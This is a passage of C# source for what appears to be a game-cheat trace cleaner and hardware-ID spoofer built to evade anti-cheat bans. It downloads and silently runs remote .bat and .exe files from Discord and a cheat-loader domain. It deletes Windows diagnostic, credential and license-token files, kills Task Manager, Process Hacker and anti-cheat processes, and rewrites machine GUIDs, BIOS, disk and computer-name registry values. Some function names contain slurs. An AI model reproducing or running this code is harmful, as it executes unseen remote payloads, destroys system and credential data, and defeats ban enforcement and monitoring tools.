            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\diesi\\AppData\\Local\\Microsoft\\Credentials",
            "C:\\Users\\All Users\\Microsoft\\Windows\\ClipSvc\\tokens.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows\\ClipSvc",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Windows\\ClipSvc\\tokens.dat.bak"
        };
        public static void OVERHAXCLEAN()
        {

            foreach (var file in GetFiles)
            {

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] {file} folder deleted.");

                FileInfo hide = new FileInfo(Environment.CurrentDirectory + file);
                hide.Attributes &= ~FileAttributes.Hidden;

                Directory.Delete(file);
                File.Delete(file);
            }
        }
        #endregion


        public static void Fuck12()
        {
            Protect.This.checkConnection();

            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Green;

            WebClient webClient = new WebClient();
            webClient.Proxy = null;
            webClient.Headers["User-Agent"] = "NOTCRACKEDOK";

            Console.Clear();
            Draw.cache();
            Draw.print1();
            Console.WriteLine("[!] Cleaning Traces");
            Thread.Sleep(4000);

            using (System.Diagnostics.Process HideConsole = new System.Diagnostics.Process())
            {
                Console.Title = "caught Cleaner";

                webClient.Headers["User-Agent"] = "NOTCRACKEDOK";
                string link7 = "https://cdn.discordapp.com/attachments/670374247335591944/670404644807114752/Caught.Power.exe";
                string location7 = @"C:\Windows\caught clean.bat";

                webClient.DownloadFile(link7, location7);

                HideConsole.StartInfo.UseShellExecute = false;
                HideConsole.StartInfo.Arguments = "caught Cleaner /hid";
                HideConsole.StartInfo.FileName = location7;
                HideConsole.Start();
                HideConsole.WaitForExit();
            }
            Console.Clear();
            Draw.cache();
            Draw.print1();
            Console.WriteLine("[!] Cleaning Traces");
            Console.WriteLine("[*] This may takeawhile..");
            
            using (System.Diagnostics.Process HideConsole = new System.Diagnostics.Process())
            {
                Console.Title = "OVERHAX Cleaner";

                webClient.Headers["User-Agent"] = "NOTCRACKEDOK";
                string link8 = "http://overhaxweebloader.cf/Cleaners/overhax%20clean.bat";
                string location8 = @"C:\Windows\overhax clean.bat";

                webClient.DownloadFile(link8, location8);

                HideConsole.StartInfo.UseShellExecute = false;
                HideConsole.StartInfo.Arguments = "OVERHAX Cleaner /hid";
                HideConsole.StartInfo.FileName = location8;
                HideConsole.Start();
                HideConsole.WaitForExit();
            }
            Console.Clear();
            Draw.cache();
            Draw.print1();
            Console.WriteLine("[+] Cleaned Traces!");
            //Thread.Sleep(4000);
            /*  try
              {
                OVERHAXCLEAN();
             }catch {
                  foreach (var file in GetFiles)
                      {
                          Console.ForegroundColor = ConsoleColor.Red;

                          Console.WriteLine($"[!] {file} Failed to delete.");
                      }
              }*/ //fixing

            Draw.cache();
            Thread.Sleep(2000);
            Console.WriteLine("[!] Spoofing regkeys");

            using (System.Diagnostics.Process HideConsole = new System.Diagnostics.Process())
            {
                Console.Title = "OVERHAX Regspoof";

                webClient.Headers["User-Agent"] = "NOTCRACKEDOK";
                string link7 = "http://overhaxweebloader.cf/Cleaners/overhax%20regspoof.bat";
                string location7 = @"C:\Windows\overhaxregspoof.bat";

                webClient.DownloadFile(link7, location7);

                HideConsole.StartInfo.UseShellExecute = false;
                HideConsole.StartInfo.Arguments = "OVERHAX Regspoof /hid";
                HideConsole.StartInfo.FileName = location7;
                HideConsole.Start();
                HideConsole.WaitForExit();
            }
            Console.Clear();
            Draw.cache();
            Thread.Sleep(4000);
            Console.WriteLine("[+] Finished Spoofing reg!");
            Draw.cache();
            Thread.Sleep(2000);
            Console.WriteLine("[!] Cleaning regkeys");

            using (System.Diagnostics.Process HideConsole = new System.Diagnostics.Process())
            {
                Console.Title = "OVERHAX Regclean";

                webClient.Headers["User-Agent"] = "NOTCRACKEDOK";
                string link7 = "http://overhaxweebloader.cf/Cleaners/overhax%20regclean.bat";
                string location7 = @"C:\Windows\overhaxregclean.bat";

                webClient.DownloadFile(link7, location7);

                HideConsole.StartInfo.UseShellExecute = false;
                HideConsole.StartInfo.Arguments = "OVERHAX Regclean /hid";
                HideConsole.StartInfo.FileName = location7;
                HideConsole.Start();
                HideConsole.WaitForExit();
            }
            Console.Clear();
            Draw.cache();
            Thread.Sleep(4000);
            Console.WriteLine("[+] Finished Cleaning reg!");
            Draw.cache();
            Thread.Sleep(2000);
            Console.WriteLine("[!] Please Wait a moment while we run our altcleaner, Keep the other window open!", Color.Aqua);

            using (System.Diagnostics.Process HideConsole = new System.Diagnostics.Process())
            {
                Console.Title = "OVERHAX ALT Cleaner";

                webClient.Headers["User-Agent"] = "NOTCRACKEDOK";
                string link7 = "http://overhaxweebloader.cf/Cleaners/OVERHAX%20ALT%20CLEAN.exe";
                string location7 = @"C:\Windows\OVERHAXALTCLEAN.exe";

                webClient.DownloadFile(link7, location7);

                HideConsole.StartInfo.UseShellExecute = false;
                HideConsole.StartInfo.Arguments = "OVERHAX ALT Cleaner /hid";
                HideConsole.StartInfo.FileName = location7;
                HideConsole.Start();
            }
            /*string links2 = "http://voltcheats.com/VoltLovesToxicSpooferYea/traces/apex.bat";
            string location2 = @"C:\Windows\apex.bat";

            webClient.DownloadFile(links2, location2);

            Process p2 = new Process();

            p2.StartInfo.UseShellExecute = false;
            p2.StartInfo.RedirectStandardOutput = true;
            p2.StartInfo.FileName = location2;
            p2.Start();

            string link3 = "http://voltcheats.com/spooferXDDDDDDDDD/traces/apex1.exe";
            string location3 = @"C:\Windows\apex1.exe";

            webClient.DownloadFile(link3, location3);

            Process.Start(location3);

            Process p3 = new Process();

            p3.StartInfo.UseShellExecute = false;
            p3.StartInfo.RedirectStandardOutput = true;
            p3.StartInfo.FileName = location3;
            p3.Start();*/

            //string output = p.StandardOutput.ReadToEnd();
            //p.WaitForExit();
            Console.Clear();
            Draw.cache();

            try
            {
                string root = @"C:\Windows\Temp";
                // If directory does not exist, create it. 
                if (!Directory.Exists(root))
                {
                    Directory.CreateDirectory(root);
                }
            } finally
            {
                Draw.cache();
                Thread.Sleep(4000);
                Draw.print1();
                Console.WriteLine("[+] Finished cleaning! Press enter to close.");
                string devcon = @"C:\Windows\Fonts\devcon.exe";
                File.Delete(devcon);
                Console.ReadLine();
            }
            //Done
            try
            {
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName == "Taskmgr")
                    {
                        process.Kill();
                    }
                }
            }
            catch
            {
            }
            try
            {
                foreach (Process process2 in Process.GetProcesses())
                {
                    if (process2.ProcessName == "ProcessHacker")
                    {
                        process2.Kill();
                    }
                }
            }
            catch
            {
            }
            try
            {
                foreach (Process process3 in Process.GetProcesses())
                {
                    if (process3.ProcessName == "EpicGamesLauncher")
                    {
                        process3.Kill();
                    }
                }
            }
            catch
            {
            }
            try
            {
                foreach (Process process4 in Process.GetProcesses())
                {
                    if (process4.ProcessName == "FolderChangesView")
                    {
                        process4.Kill();
                    }


                }
            }
            catch
            {
            }

        }



        public static void Terminate(String name)
        {
            Process[] processes11 = Process.GetProcessesByName("" + name);
            if (processes11.Length == 0)
            {

            }
            else
            {
                foreach (var process in processes11)
                {
                    try
                    {
                        ManagementObject classInstance =
                            new ManagementObject("root\\CIMV2",
                            "Win32_Process.Handle='" + process.Id + "'",
                            null);

                        // Obtain in-parameters for the method
                        ManagementBaseObject inParams =
                            classInstance.GetMethodParameters("Terminate");

                        // Add the input parameters.

                        // Execute the method and obtain the return values.
                        ManagementBaseObject outParams =
                            classInstance.InvokeMethod("Terminate", inParams, null);


                    }

                    catch { }

                }
            }
        }


        public static void FileCleaner()
        {


            Thread t = new Thread(FeggotCleaner);
            t.Start();
            Cleaners.Cleantraces();
            Cleaners.Fuck12();
            Terminate("EpicGamesLauncher");
            Terminate("FortniteClient-Win64-Shipping");
            Terminate("EasyAntiCheat");
            Terminate("BeService");



            WebClient wb = new WebClient();



            var Directorys = Directory.GetFiles(@"C:\Windows\System32\config");
            foreach (var i in Directorys)
            {
                if (i.Contains(@"COMPONENTS{"))
                {
                    CleanFile(@"C:\Windows\System32\config\" + i);
                }
            }


            try
            {
                try
                {
                    var i = Directory.GetFiles(@"C:\Windows\Temp");
                    foreach (var j in i)
                    {
                        CleanFile(j);
                    }
                }
                catch
                {
                }
                try
                {
                    var i = Directory.GetDirectories(@"C:\Windows\Temp");
                    foreach (var j in i)
                    {
                        CleanDir(j);
                    }
                }
                catch
                {
                }
            }
            catch
            {
            }



        }



        public static void ModifyRegistry()
        {
            List<string> list = new List<string>();
            list.Add("MSI A320M PRO - E");
            list.Add("Asus Prime A320M-C R2.0");
            list.Add("Gigabyte GA - A320M - H");
            list.Add("ASRock Z390 Phantom Gaming SLI");
            list.Add("Asus ROG Rampage VI Extreme Omega");
            list.Add("Asus Prime H310I - Plus R2.0");
            list.Add("Asus ROG Zenith Extreme Alpha X399");
            list.Add("MSI MEG X299 Creation");
            list.Add("Asus P11C - X");
            list.Add("ASRock AB350M - HDV R3.0");
            list.Add("MSI B450M Pro-VDH V2");
            list.Add("MSI B450M Bazooka V2");
            list.Add("Asus Prime B450M - A / CSM");
            list.Add("Asus Prime H310I - Plus R2.0 / CSM");
            list.Add("Gigabyte GA-AB350M-DS3H V2 (rev. 1.1)");
            list.Add("Gigabyte B360 M AORUS PRO");
            list.Add("Gigabyte X299-WU8");
            list.Add("MSI MAG Z390M Mortar");
            Random random = new Random();
            int index = random.Next(list.Count);
            string value = list[index];
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag = registryKey != null;
            bool flag2 = flag;
            if (flag2)
            {
                registryKey.SetValue("BaseBoardProduct", value, RegistryValueKind.String);
                registryKey.Close();
            }
            List<string> list2 = new List<string>();
            list2.Add("1.0");
            list2.Add("2.0");
            list2.Add("3.0");
            list2.Add("4.0");
            list2.Add("5.0");
            list2.Add("6.0");
            list2.Add("7.0");
            list2.Add("8.0");
            list2.Add("9.0");
            list2.Add("1.1");
            list2.Add("1.2");
            list2.Add("1.3");
            list2.Add("1.4");
            list2.Add("1.5");
            list2.Add("1.6");
            Random random2 = new Random();
            int index2 = random2.Next(list2.Count);
            string value2 = list2[index2];
            RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag3 = registryKey2 != null;
            bool flag4 = flag3;
            if (flag4)
            {
                registryKey2.SetValue("BaseBoardVersion", value2, RegistryValueKind.String);
                registryKey2.Close();
            }
            List<string> list3 = new List<string>();
            list3.Add("MSI");
            list3.Add("Asus");
            list3.Add("Gigabyte");
            list3.Add("ASRock");
            list3.Add("Biostar");
            list3.Add("EVGA");
            Random random3 = new Random();
            int index3 = random3.Next(list3.Count);
            string value3 = list3[index3];
            RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag5 = registryKey3 != null;
            bool flag6 = flag5;
            if (flag6)
            {
                registryKey3.SetValue("BaseBoardManufacturer", value3, RegistryValueKind.String);
                registryKey3.Close();
            }
            RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag7 = registryKey4 != null;
            bool flag8 = flag7;
            if (flag8)
            {
                registryKey4.SetValue("SystemVersion", value2, RegistryValueKind.String);
                registryKey4.Close();
            }
            RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag9 = registryKey5 != null;
            bool flag10 = flag9;
            if (flag10)
            {
                registryKey5.SetValue("SystemManufacturer", value3, RegistryValueKind.String);
                registryKey5.Close();
            }
            List<string> list4 = new List<string>();
            list4.Add("01/02/2016");
            list4.Add("01/04/2016");
            list4.Add("01/03/2016");
            list4.Add("01/05/2016");
            list4.Add("02/05/2016");
            list4.Add("03/05/2016");
            Random random4 = new Random();
            int index4 = random4.Next(list4.Count);
            string value4 = list4[index4];
            RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag11 = registryKey6 != null;
            bool flag12 = flag11;
            if (flag12)
            {
                registryKey6.SetValue("BIOSReleaseDate", value4, RegistryValueKind.String);
                registryKey6.Close();
            }
            List<string> list5 = new List<string>();
            list5.Add("PL-7A37");
            list5.Add("PL-7A87");
            list5.Add("PL-8A37");
            list5.Add("PL-7A39");
            list5.Add("PL-3A37");
            list5.Add("PL-7A47");
            list5.Add("PL-7A35");
            list5.Add("PL-7A66");
            list5.Add("PL-6A67");
            list5.Add("PL-7B37");
            list5.Add("PL-7C37");
            list5.Add("PL-7D37");
            list5.Add("PL-7AE1");
            list5.Add("PL-7A17");
            list5.Add("PL-71E7");
            list5.Add("PL-1AE7");
            list5.Add("PL-7A77");
            list5.Add("PL-7A62");
            list5.Add("PL-7A33");
            list5.Add("PL-7A19");
            Random random5 = new Random();
            int index5 = random5.Next(list5.Count);
            string value5 = list5[index5];
            RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag13 = registryKey7 != null;
            bool flag14 = flag13;
            if (flag14)
            {
                registryKey7.SetValue("SystemProductName", value5, RegistryValueKind.String);
                registryKey7.Close();
            }
            List<string> list6 = new List<string>();
            list6.Add("A.04");
            list6.Add("A.09");
            list6.Add("A.60");
            list6.Add("A.54");
            list6.Add("A.23");
            list6.Add("A.62");
            list6.Add("A.13");
            list6.Add("A.11");
            list6.Add("A.22");
            list6.Add("A.33");
            list6.Add("A.44");
            list6.Add("A.55");
            list6.Add("A.56");
            list6.Add("A.57");
            list6.Add("A.93");
            list6.Add("A.69");
            Random random6 = new Random();
            int index6 = random6.Next(list6.Count);
            string value6 = list6[index6];
            RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag15 = registryKey8 != null;
            bool flag16 = flag15;
            if (flag16)
            {
                registryKey8.SetValue("BIOSVersion", value6, RegistryValueKind.String);
                registryKey8.Close();
            }
            List<string> list7 = new List<string>();
            list7.Add("American Megatrends Inc.");
            list7.Add("Dell Inc.");
            list7.Add("Phoenix Technologies, Ltd");
            list7.Add("Lenovo");
            list7.Add("Packard Bell");
            list7.Add("Award Software, Inc.");
            list7.Add("Acer");
            list7.Add("Insyde Corp.");
            list7.Add("TOSHIBA");
            list7.Add("Intel Corporation");
            list7.Add("IBM");
            list7.Add("innotek GmbH");
            list7.Add("Gateway");
            list7.Add("Sun Microsystems");
            Random random7 = new Random();
            int index7 = random7.Next(list7.Count);
            string value7 = list7[index7];
            RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag17 = registryKey9 != null;
            bool flag18 = flag17;
            if (flag18)
            {
                registryKey9.SetValue("BIOSVendor", value7, RegistryValueKind.String);
                registryKey9.Close();
            }
            RegistryKey registryKey10 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag19 = registryKey10 != null;
            bool flag20 = flag19;
            if (flag20)
            {
                registryKey10.SetValue("BIOSVendor", value7, RegistryValueKind.String);
                registryKey10.Close();
            }
            RegistryKey registryKey11 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag21 = registryKey11 != null;
            bool flag22 = flag21;
            if (flag22)
            {
                registryKey11.SetValue("BIOSVersion", value6, RegistryValueKind.String);
                registryKey11.Close();
            }
            RegistryKey registryKey12 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag23 = registryKey12 != null;
            bool flag24 = flag23;
            if (flag24)
            {
                registryKey12.SetValue("SystemProductName", value5, RegistryValueKind.String);
                registryKey12.Close();
            }
            RegistryKey registryKey13 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag25 = registryKey13 != null;
            bool flag26 = flag25;
            if (flag26)
            {
                registryKey13.SetValue("BIOSReleaseDate", value4, RegistryValueKind.String);
                registryKey13.Close();
            }
            RegistryKey registryKey14 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag27 = registryKey14 != null;
            bool flag28 = flag27;
            if (flag28)
            {
                registryKey14.SetValue("SystemManufacturer", value3, RegistryValueKind.String);
                registryKey14.Close();
            }
            RegistryKey registryKey15 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag29 = registryKey15 != null;
            bool flag30 = flag29;
            if (flag30)
            {
                registryKey15.SetValue("BaseBoardManufacturer", value3, RegistryValueKind.String);
                registryKey15.Close();
            }
            RegistryKey registryKey16 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag31 = registryKey16 != null;
            bool flag32 = flag31;
            if (flag32)
            {
                registryKey16.SetValue("SystemVersion", value2, RegistryValueKind.String);
                registryKey16.Close();
            }
            RegistryKey registryKey17 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag33 = registryKey17 != null;
            bool flag34 = flag33;
            if (flag34)
            {
                registryKey17.SetValue("BaseBoardVersion", value2, RegistryValueKind.String);
                registryKey17.Close();
            }
            RegistryKey registryKey18 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag35 = registryKey18 != null;
            bool flag36 = flag35;
            if (flag36)
            {
                registryKey18.SetValue("BaseBoardProduct", value, RegistryValueKind.String);
                registryKey18.Close();
            }
            Guid guid = Guid.NewGuid();
            RegistryKey registryKey19 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SystemInformation", true);
            bool flag37 = registryKey19 != null;
            bool flag38 = flag37;
            if (flag38)
            {
                registryKey19.SetValue("ComputerHardwareId", "{" + guid + "}", RegistryValueKind.String);
                registryKey19.Close();
            }
            string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            char[] array = new char[3];
            Random random8 = new Random();
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = text[random8.Next(text.Length)];
            }
            string str = new string(array);
            string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            char[] array2 = new char[30];
            Random random9 = new Random();
            for (int j = 0; j < array2.Length; j++)
            {
                array2[j] = text2[random9.Next(text2.Length)];
            }
            string str2 = new string(array2);
            string text3 = "abcdefghijklmnopqrstuvwxyz0123456789";
            char[] array3 = new char[8];
            Random random10 = new Random();
            for (int k = 0; k < array3.Length; k++)
            {
                array3[k] = text3[random10.Next(text3.Length)];
            }
            string text4 = new string(array3);
            string text5 = "0123456789";
            char[] array4 = new char[11];
            Random random11 = new Random();
            for (int l = 0; l < array4.Length; l++)
            {
                array4[l] = text5[random11.Next(text5.Length)];
            }
            string str3 = new string(array4);
            RegistryKey registryKey20 = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true);
            bool flag39 = registryKey20 != null;
            bool flag40 = flag39;
            if (flag40)
            {
                registryKey20.SetValue("MachineId", str + str2, RegistryValueKind.String);
                registryKey20.Close();
            }
            RegistryKey registryKey21 = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true);
            bool flag41 = registryKey21 != null;
            bool flag42 = flag41;
            if (flag42)
            {
                registryKey21.SetValue("AccountId", text4 + text4 + text4, RegistryValueKind.String);
                registryKey21.Close();
            }
            RegistryKey registryKey22 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", true);
            bool flag43 = registryKey22 != null;
            bool flag44 = flag43;
            if (flag44)
            {
                registryKey22.SetValue("Identifier", text4 + "-A", RegistryValueKind.String);
                registryKey22.Close();
            }
            RegistryKey registryKey23 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", true);
            bool flag45 = registryKey23 != null;
            bool flag46 = flag45;
            if (flag46)
            {
                registryKey23.SetValue("Identifier", text4 + "-A", RegistryValueKind.String);
                registryKey23.Close();
            }
            Guid guid2 = Guid.NewGuid();
            RegistryKey registryKey24 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Feeds", true);
            bool flag47 = registryKey24 != null;
            bool flag48 = flag47;
            if (flag48)
            {
                registryKey24.SetValue("BackgroundSync", guid2, RegistryValueKind.String);
                registryKey24.Close();
            }
            try
            {
                RegistryKey registryKey25 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\IdentityCRL\\ExtendedProperties", true);
                bool flag49 = registryKey25 != null;
                bool flag50 = flag49;
                if (flag50)
                {
                    registryKey25.SetValue("LID", str3 + "BE123", RegistryValueKind.String);
                    registryKey25.Close();
                }
            }
            catch
            {
            }
            Random random12 = new Random();
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\Connected", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\Disconnected", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\EmailImage", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\FaxImage", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\PrintImage", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\ScanButton", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\STIproxyEvent", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\IdentityCRL\\ExtendedProperties", "LID", random12.Next(10000, 99999) + random12.Next(100000, 999999) + "BE123");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Feeds", "BackgroundSync", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", SIMBIOS.Spoof.RandomString(8) + "-A");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", SIMBIOS.Spoof.RandomString(8) + "-A");
            List<string> list8 = new List<string>();
            list8.Add("MSI A320M PRO - E");
            list8.Add("Asus Prime A320M-C R2.0");
            list8.Add("Gigabyte GA - A320M - H");
            list8.Add("ASRock Z390 Phantom Gaming SLI");
            list8.Add("Asus ROG Rampage VI Extreme Omega");
            list8.Add("Asus Prime H310I - Plus R2.0");
            list8.Add("Asus ROG Zenith Extreme Alpha X399");
            list8.Add("MSI MEG X299 Creation");
            list8.Add("Asus P11C - X");
            list8.Add("ASRock AB350M - HDV R3.0");
            list8.Add("MSI B450M Pro-VDH V2");
            list8.Add("MSI B450M Bazooka V2");
            list8.Add("Asus Prime B450M - A / CSM");
            list8.Add("Asus Prime H310I - Plus R2.0 / CSM");
            list8.Add("Gigabyte GA-AB350M-DS3H V2 (rev. 1.1)");
            list8.Add("Gigabyte B360 M AORUS PRO");
            list8.Add("Gigabyte X299-WU8");
            list8.Add("MSI MAG Z390M Mortar");
            Boolean SetComputerName(String Name)
            {
                String RegLocComputerName = @"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName";
                try
                {
                    string compPath = "Win32_ComputerSystem.Name='" + System.Environment.MachineName + "'";
                    using (ManagementObject mo = new ManagementObject(new ManagementPath(compPath)))
                    {
                        ManagementBaseObject inputArgs = mo.GetMethodParameters("Rename");
                        inputArgs["Name"] = Name;
                        ManagementBaseObject output = mo.InvokeMethod("Rename", inputArgs, null);
                        uint retValue = (uint)Convert.ChangeType(output.Properties["ReturnValue"].Value, typeof(uint));
                        if (retValue != 0)
                        {
                            throw new Exception("Computer could not be changed due to unknown reason.");
                        }
                    }

                    RegistryKey ComputerName = Registry.LocalMachine.OpenSubKey(RegLocComputerName);
                    if (ComputerName == null)
                    {
                        throw new Exception("Registry location '" + RegLocComputerName + "' is not readable.");
                    }
                    if (((String)ComputerName.GetValue("ComputerName")) != Name)
                    {
                        throw new Exception("The computer name was set by WMI but was not updated in the registry location: '" + RegLocComputerName + "'");
                    }
                    ComputerName.Close();
                    ComputerName.Dispose();
                }
                catch (Exception ex)
                {
                    return false;
                }
                return true;
            }
            SetComputerName(SIMBIOS.Spoof.RandomString(20));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct", SIMBIOS.Spoof.RandomString(20));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "SystemFamily", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "SerialNumber", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "UDN", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Media\\WMSDK\\General", "UniqueID", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "MachineId", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware", "HwProfileGuid", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion", "BuildGUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "ComputerHardwareId", "{" + Convert.ToString(Guid.NewGuid()) + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "ComputerHardwareIds", string.Concat(new string[]
            {
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}"
            }));
